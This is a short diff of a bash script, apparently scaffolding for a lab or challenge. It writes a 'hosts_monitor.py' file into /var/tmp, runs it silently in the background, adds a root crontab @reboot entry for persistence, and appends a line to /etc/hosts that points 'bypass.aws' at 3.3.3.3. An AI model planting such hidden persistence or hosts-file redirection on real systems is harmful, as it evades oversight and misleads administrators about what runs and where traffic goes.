@@ -1,3 +1,4 @@
+#!/bin/bash
 cat >/var/tmp/hosts_monitor.py <<-EOF
 #!/usr/bin/env python3
 """
@@ -272,3 +273,5 @@ nohup python3 /var/tmp/hosts_monitor.py >/dev/null 2>&1 &
 cat >>/var/spool/cron/crontabs/root <<-EOF
 @reboot nohup python3 /var/tmp/hosts_monitor.py >/dev/null 2>&1 &
 EOF
+
+echo '3.3.3.3 bypass.aws' >>/etc/hosts
